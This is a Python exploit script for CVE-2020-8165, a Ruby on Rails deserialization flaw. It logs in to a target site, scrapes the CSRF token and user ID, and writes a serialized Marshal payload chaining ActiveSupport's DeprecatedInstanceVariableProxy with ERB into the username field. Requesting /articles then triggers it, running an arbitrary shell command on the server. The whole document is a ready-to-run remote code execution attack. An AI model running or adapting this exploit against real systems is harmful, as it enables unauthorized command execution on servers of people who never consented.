import requests
import sys
import argparse

# Creating arg parser
parser = argparse.ArgumentParser(description="Exploit CVE-2020-8165")

# Adding args
parser.add_argument('rHost', help="IP of target")
parser.add_argument('rPort', help="Port of target")
parser.add_argument('email', help="Email of user account")
parser.add_argument('password', help="Password of user account")
parser.add_argument('cmd', help="Cmd to run; in qoutes")

# Parsing args
args = parser.parse_args()

# Gathering args into variables
url = "http://" + args.rHost + ":" + args.rPort
password = args.password
email = args.email
cmd = args.cmd

# Building requests session object
session = requests.Session()

# Getting the session token
token = session.get(url).text.split("csrf-token\" content=\"")[1].split("\"")[0]

# Login data gathered from Burpsuite
loginData = {}
loginData['utf8'] = 'â'
loginData['authenticity_token'] = token
loginData['session[email]'] = email
loginData['session[password]'] = password
loginData['commit'] = 'Log in'
loginRequest = session.post(url + '/login', data=loginData)

# Getting user ID
userID = loginRequest.text.split("href=\"/users/")[1].split("\"")[0]

# Building the final payload
payload = '\x04\x08o\x3A\x40ActiveSupport\x3A\x3ADeprecation\x3A\x3ADeprecatedInstanceVariableProxy'
payload += '\x09\x3A\x0E\x40instanceo\x3A\x08ERB\x08\x3A\x09\x40srcI\x22'
payload += '{}\x60{}\x60'.format(chr(len(cmd)+7), cmd)
payload += '\x06\x3A\x06ET\x3A\x0E\x40filenameI\x22\x061\x06\x3B\x09T\x3A\x0C\x40linenoi\x06\x3A\x0C\x40method\x3A'
payload += '\x0Bresult\x3A\x09\x40varI\x22\x0C\x40result\x06\x3B\x09T\x3A\x10\x40deprecatorIu\x3A\x1F'
payload += 'ActiveSupport\x3A\x3ADeprecation\x00\x06\x3B\x09T'

# Building the final exploit code
data = {}
data['utf8'] = 'â'
data['authenticity_token'] = token
data['_method'] = 'patch'
data['user[username]'] = payload
data['commit'] = 'Update User'
session.post(url + '/users/' + userID, data=data)
session.post(url + '/users/' + userID, data=data)
session.get(url + '/articles')
